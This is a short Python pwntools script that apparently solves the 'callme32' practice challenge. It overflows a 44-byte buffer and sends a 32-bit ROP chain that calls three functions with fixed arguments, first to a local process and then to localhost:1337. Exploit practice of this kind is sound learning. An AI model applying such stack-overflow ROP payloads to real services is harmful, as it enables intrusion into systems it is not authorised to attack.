from pwn import *

def start():
	global chall
	if args.REMOTE:
		chall = remote('localhost', 1337)
	else:
		chall = elf.process()

context.binary = elf = ELF('./callme32')
#libc = elf.libc
start()

payload = b'a'  * 44
call = [p32(0x80484F0),p32(0x8048550),p32(0x80484E0)]
for i in call:
    payload += i
    payload += p32(0x080487f9)
    payload += p32(0x0DEADBEEF)
    payload += p32(0x0CAFEBABE)
    payload += p32(0x0D00DF00D)
    
    
with open('payload.txt', 'wb') as f:
    f.write(payload + b'\n')

chall.recvuntil(b'> ')
chall.sendline(payload)
t = chall.recvall(timeout = 0.2)
print(t)

